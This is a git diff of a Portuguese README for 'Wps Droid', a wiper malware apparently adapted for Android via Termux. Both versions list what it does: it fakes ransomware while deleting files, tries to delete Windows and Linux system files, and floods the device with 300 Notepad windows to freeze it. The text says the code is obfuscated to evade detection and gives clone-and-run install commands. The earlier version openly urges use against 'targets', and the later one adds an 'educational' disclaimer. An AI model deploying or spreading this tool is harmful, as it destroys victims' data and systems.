@@ -1,31 +1,35 @@
-# Wps droid
-Wps droid- versão do wps(wiper feito originalmente por darkZe010) adaptada para ambientes android
+# Wps Droid
 
-1️⃣ engana o alvo dizendo que é um ransonware mas apaga do mesmo jeito.
+**Wps Droid** – Versão do WPS (wiper) originalmente criado por DarkZe010, adaptada para ambientes Android.
 
-2️⃣ tenta apagar arquivos do sistema do windows ou linux.
+---
 
-3️⃣ cria 300 arquivos zombando do alvo e abrindo todos cada um por cada no bloco de notas, travando o dispositivo.
+## ⚠️ Aviso Importante
 
-4️⃣ abri um site: xvidros.com e fecha.
+Este script é **malware** e pode causar **perda de dados** ou travamento do sistema. Ele foi desenvolvido para **fins educativos e de análise de segurança**.  
 
-OBS: O CÓDIGO FOI OFUSCADO E DIMINUIDO, PARA DIFICULTAR A DETECÇÃO. VOCÊ VAI TER QUE COLOCAR EM UMA EXECUTÁVEL PARA COMEÇAR A USAR PARA FINS EDUCATIVOS NOS ALVOS!!
+**Não execute este código em máquinas de produção ou de terceiros.**  
+ equipe Shadowbyte Group / vøidh7 **não se responsabilizam por uso indevido**.
 
-INSTALAÇÃO (TERMUX):
+---
 
-1- pkg install python3
+## Funcionalidades
 
-2- pkg install git
+1. Engana o usuário fingindo ser um ransomware, mas apaga arquivos do dispositivo de qualquer forma.  
+2. Tenta apagar arquivos do sistema em Windows ou Linux.  
+3. Cria 300 arquivos de teste, abre cada um no bloco de notas para travar o dispositivo (simulação de ataque).  
 
-3- git clone https://github.com/DarkZer010/TWps
+> O código foi **ofuscado e minimizado** para dificultar a detecção.  
+> O código original está em `SOURCECODE/wps.py`.
 
+---
 
-4- cd TWps
+## Instalação (Termux)
 
-5- pip install -r requirements.txt
-
-6- python3
-
-!! O criador desse malware não se responsabiliza pelo uso indevido do script !!
-
-# Shadowbyte Group and vøidh7
+```bash
+pkg install python3
+pkg install git
+git clone https://github.com/DarkZer010/TWps
+cd TWps
+pip install -r requirements.txt
+python3 wps.py
